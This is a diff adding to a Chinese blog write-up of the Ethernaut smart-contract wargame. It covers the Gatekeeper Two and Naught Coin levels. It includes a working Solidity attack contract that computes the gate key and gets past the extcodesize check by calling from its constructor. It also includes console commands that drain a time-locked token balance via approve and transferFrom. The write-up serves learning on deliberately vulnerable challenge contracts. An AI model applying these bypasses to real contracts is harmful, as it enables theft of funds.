@@ -27,7 +27,7 @@
 <meta property="og:image" content="http://xiaoxiaoxiaoxiaocai.github.io.com/images/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-11-29%20222116.png">
 <meta property="og:image" content="http://xiaoxiaoxiaoxiaocai.github.io.com/images/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-11-29%20222139.png">
 <meta property="article:published_time" content="2023-11-27T08:28:03.000Z">
-<meta property="article:modified_time" content="2023-11-29T14:58:02.414Z">
+<meta property="article:modified_time" content="2024-04-10T13:40:35.898Z">
 <meta property="article:author" content="xiaocai">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:image" content="http://xiaoxiaoxiaoxiaocai.github.io.com/images/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-11-27%20175711.png">
@@ -223,7 +223,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          5.9k words
+          9.2k words
         
       </span>
     
@@ -234,7 +234,7 @@
         
         
         
-          49 mins
+          77 mins
         
       </span>
     
@@ -322,6 +322,31 @@
 <p>然后需要前16个字节，两个字符为一个字节，2+2*16&#x3D;34</p>
 <p><img src="/../images/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-11-29%20222139.png" srcset="/img/loading.gif" lazyload alt="屏幕截图 2023-11-29 222139"></p>
 <p>得到密钥，然后将其合约填入并调用unlock函数即可通关。</p>
+<h3 id="Gatekeeper-Two"><a href="#Gatekeeper-Two" class="headerlink" title="Gatekeeper Two"></a>Gatekeeper Two</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.6.0;<br><br>contract GatekeeperTwo &#123;<br><br>  address public entrant;<br><br>  modifier gateOne() &#123;<br>    require(msg.sender != tx.origin);<br>    _;<br>  &#125;<br><br>  modifier gateTwo() &#123;<br>    uint x;<br>    assembly &#123; x := extcodesize(caller()) &#125;<br>    require(x == 0);<br>    _;<br>  &#125;<br><br>  modifier gateThree(bytes8 _gateKey) &#123;<br>    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1);<br>    _;<br>  &#125;<br><br>  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) &#123;<br>    entrant = tx.origin;<br>    return true;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>三个关卡，然后true</p>
+<h4 id="Analyse-2"><a href="#Analyse-2" class="headerlink" title="Analyse"></a>Analyse</h4><p>第一关我们可以使用智能合约调用enter，而不是账号。</p>
+<p>第二关，只允许外部调用，不允许合约之间调用。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs solidity">modifier gateTwo() &#123;<br>   uint x;<br>   assembly &#123; x := extcodesize(caller()) &#125;<br>   require(x == 0);<br>   _;<br> &#125;<br></code></pre></td></tr></table></figure>
+
+<p>第三关</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs solidity">modifier gateThree(bytes8 _gateKey) &#123;<br>    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1);<br>    _;<br>  &#125;<br></code></pre></td></tr></table></figure>
+
+<p>uint64(0) – 1，为uint64最大值。</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">bytes8</span><span class="hljs-params">(keccak256(abi.encodePacked(msg.sender)</span></span>))部分是从msg<span class="hljs-selector-class">.sender</span>(即本例中的Exploiter合约)中抽取低位的<span class="hljs-number">8</span>字节并将其转换为uint64。<br><br>指令<span class="hljs-selector-tag">a</span> ^ b是位的XOR（异或）操作。XOR 操作是这样的：如果位置上的两个位相等，将产生一个 <span class="hljs-string">&quot;0&quot;</span>，否则将产生一个 <span class="hljs-string">&quot;1&quot;</span>。为了使<span class="hljs-selector-tag">a</span> ^ <span class="hljs-selector-tag">b</span> = <span class="hljs-built_in">type</span>(uint64).max（都是<span class="hljs-number">1</span>）， b必须是a的逆数。<br><br>这意味着我们的gateKey必须是<span class="hljs-built_in">bytes8</span>(<span class="hljs-built_in">keccak256</span>(abi<span class="hljs-selector-class">.encodePacked</span>(msg.sender))的逆数。<br><br>在solidity中，没有 <span class="hljs-string">&quot;逆数&quot;</span>的操作，但我们可以通过输入数和一个只有 <span class="hljs-string">&quot;F&quot;</span>的值之间做 <span class="hljs-string">&quot;XOR &quot;</span>来重新创建它。<br></code></pre></td></tr></table></figure>
+
+<p>所以只需计算bytes8(keccak256(abi.encodePacked(address(this)))) ^ 0xFFFFFFFFFFFFFFFF</p>
+<h4 id="attack-1"><a href="#attack-1" class="headerlink" title="attack"></a>attack</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.0;<br><br>contract attack&#123;<br>  constructor(address _vum)&#123;<br>    bytes8 _key = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max);<br>    bytes memory payload = abi.encodeWithSignature(&quot;enter(bytes8)&quot;,_key);<br>    (bool success,)=_vum.call(payload);<br>    require(success,&quot;failed&quot;);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h3 id="Naught-Coin"><a href="#Naught-Coin" class="headerlink" title="Naught Coin"></a>Naught Coin</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.0;<br><br>import &quot;openzeppelin-contracts-08/token/ERC20/ERC20.sol&quot;;<br><br>contract NaughtCoin is ERC20 &#123;<br>    // string public constant name = &#x27;NaughtCoin&#x27;;<br>    // string public constant symbol = &#x27;0x0&#x27;;<br>    // uint public constant decimals = 18;<br>    uint256 public timeLock = block.timestamp + 10 * 365 days;<br>    uint256 public INITIAL_SUPPLY;<br>    address public player;<br><br>    constructor(address _player) ERC20(&quot;NaughtCoin&quot;, &quot;0x0&quot;) &#123;<br>        player = _player;<br>        INITIAL_SUPPLY = 1000000 * (10 ** uint256(decimals()));<br>        // _totalSupply = INITIAL_SUPPLY;<br>        // _balances[player] = INITIAL_SUPPLY;<br>        _mint(player, INITIAL_SUPPLY);<br>        emit Transfer(address(0), player, INITIAL_SUPPLY);<br>    &#125;<br><br>    function transfer(address _to, uint256 _value) public override lockTokens returns (bool) &#123;<br>        super.transfer(_to, _value);<br>    &#125;<br><br>    // Prevent the initial owner from transferring tokens until the timelock has passed<br>    modifier lockTokens() &#123;<br>        if (msg.sender == player) &#123;<br>            require(block.timestamp &gt; timeLock);<br>            _;<br>        &#125; else &#123;<br>            _;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>要求代币变为0即可。</p>
+<p>ERC20标准转账代币有两种方式，transfer以及transferFrom，但是transfer被重写了，所以只能用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function transferFrom(<br>        address from,<br>        address to,<br>        uint256 amount<br>    ) public virtual override returns (bool) &#123;<br>        address spender = _msgSender();<br>        _spendAllowance(from, spender, amount);<br>        _transfer(from, to, amount);<br>        return true;<br>    &#125;<br></code></pre></td></tr></table></figure>
+
+<p>但是转帐前，需要approver授权。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs solidity">//secondaddr是另外一个账户地址<br>secondad=&#x27;0x02823a3D576A35988a623BB3d7F9e9A6D0ae7674&#x27;<br>totalvalue=&#x27;1000000000000000000000000&#x27;<br>//给自己授权<br>await contract.approve(player,totalvalue)<br>await contract.transferFrom(player,secondaddr,totalvalue)<br></code></pre></td></tr></table></figure>
+
 
                 
               </div>
